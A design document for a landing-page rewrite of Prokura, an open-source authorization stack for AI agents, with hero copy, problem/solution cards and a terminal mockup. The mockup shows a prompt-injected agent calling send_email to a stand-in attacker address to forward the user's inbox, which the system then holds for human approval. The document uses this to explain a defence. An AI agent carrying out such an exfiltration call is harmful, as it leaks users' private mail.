# Landing page rework: scene-first hero — design

**Date:** 2026-08-10
**Scope:** `docs/index.html` only. No other page changes.
**Goal:** A newcomer landing on the page feels the problem viscerally within the
first screenful — *"my agents are unaccountable copies of me"* — before any
solution vocabulary appears. Depth signals (standards, stack, rigor) remain for
security engineers and OSS evaluators, but demoted to second position.

## Diagnosis (why the current page doesn't land)

1. The hero opens with a category label ("Agentic identity, assembled"), not a
   problem the reader has.
2. The lede is one ~90-word sentence that answers the problem in the same
   breath it raises it — jargon arrives before pain lands.
3. The four Q-cards answer themselves immediately in mechanism jargon,
   defusing the tension the questions create.

## Changes

### 1. Hero

Eyebrow, chips row, and `<title>` unchanged. Replace headline and lede:

- **H1:** `Your agent shouldn't <i>be</i> you.`
- **Lede (verbatim):**

  > To let an AI agent act for you today, you hand it your password or a
  > long-lived API key. From that moment the agent <b>is</b> you — anything
  > it's tricked into doing, it does as you, with everything you can reach,
  > and no log can tell you apart. Prokura replaces that with authority you
  > <b>grant</b>: scoped to a task, consent-gated per agent, human-approved
  > when it matters, and revocable in one click. Built from <b>Keycloak,
  > OpenFGA, and OpenBao</b>; reachable over <b>MCP</b>; an OSS answer to
  > "Auth0 for AI Agents."

Rationale: two sentences of second-person pain → one plain-language sentence of
what Prokura does → one sentence of stack credibility.

### 2. New terminal panel directly under the hero (inside the hero section, after the chips)

Uses the existing `screen` / `bar` / `body term` classes from
`walkthroughs/walkthrough.css` (already linked). Content (semantic, exact
span classes at implementer's discretion, matching walkthrough conventions —
`c` comment, `k` key, `g` green/ok, `b` bold/status, `p` prompt, `o` orange):

```
# a prompt-injected agent tries a sensitive act — as it would with your password:
tools/call send_email { to: "attacker@…", subject: "forwarding your inbox" }

# with prokura, it doesn't have your password — it has delegated authority:
HTTP/1.1 428 approval_required        # nothing sent. a human sees the real payload
→ you deny on the trusted approval page … the action never executes
→ or hit the kill switch: every token this agent holds is dead in seconds
```

Caption (`.cap` or a `p.note`-style line under the screen):
**Fail closed, not fail open** — this runs live in the demo below.

Constraint: the panel must reflect real stack behavior — the 428
`approval_required` refusal is real (tools-api), deny-on-trusted-UI is real
(approval service :8120), kill-switch revocation is real (M9). No invented
output.

### 3. "Why this exists" Q-cards → today/prokura pairs

Section `h2` and kicker unchanged. Each `.qcard` keeps its `n` (Q1–Q4) and `q`
(question) elements; the `.a` answer is replaced by a two-line pair plus a
small mono mechanism tag. Copy (verbatim):

- **Q1 · Who authorized this agent to act as me?**
  - *Today:* nobody can say — a shared password looks exactly like you.
  - *Prokura:* the agent carries its own token naming both you and it.
  - Tag: `RFC 8693`
- **Q2 · What exactly can it do — and nothing more?**
  - *Today:* everything you can do, everywhere, until you rotate the password.
  - *Prokura:* one provider, named scopes, 15-minute tokens, consent per agent.
  - Tag: `broker + FGA`
- **Q3 · Does a human decide when it matters?**
  - *Today:* you find out afterwards, if ever.
  - *Prokura:* sensitive actions stop and wait for your approval of the exact payload.
  - Tag: `CIBA step-up`
- **Q4 · Can I stop it — right now?**
  - *Today:* rotate your password and break everything else that uses it.
  - *Prokura:* revoke that one delegation; measured time-to-stop in seconds.
  - Tag: `kill switch`

Styling: add a small amount of CSS in the page's existing inline `<style>`
block — a muted "today" line, an ink "prokura" line, and a `.qcard .mech`
mono tag (same visual family as `.navcard .ext`). No changes to
`walkthrough.css`.

The section's intro `p.lead` may be lightly trimmed to avoid restating the
lede; the closing "reference architecture, not a SaaS" paragraph stays.

### 4. Untouched

"Start here", the M1–M9 control cards, "Understand it", "Take the tour by
flow", and the footer are unchanged.

## Error handling / testing

Static HTML — no runtime behavior. Verification: open the page in a browser
(light and dark if the stylesheet themes both), check the hero reads
problem-first, the terminal panel renders in the established aesthetic, and
the Q-cards scan as today→prokura pairs. Screenshot for the user per the
repo's verification discipline.

## Success criteria

- A reader with no OAuth/MCP background understands the problem from the
  first two sentences.
- No mechanism jargon (token exchange, CIBA, FGA, audience) appears before
  the reader has been shown the pain — jargon lives in tags and lower
  sections.
- The page still signals depth: standards names present as tags, stack named
  in the lede's final sentence, everything below the fold unchanged.
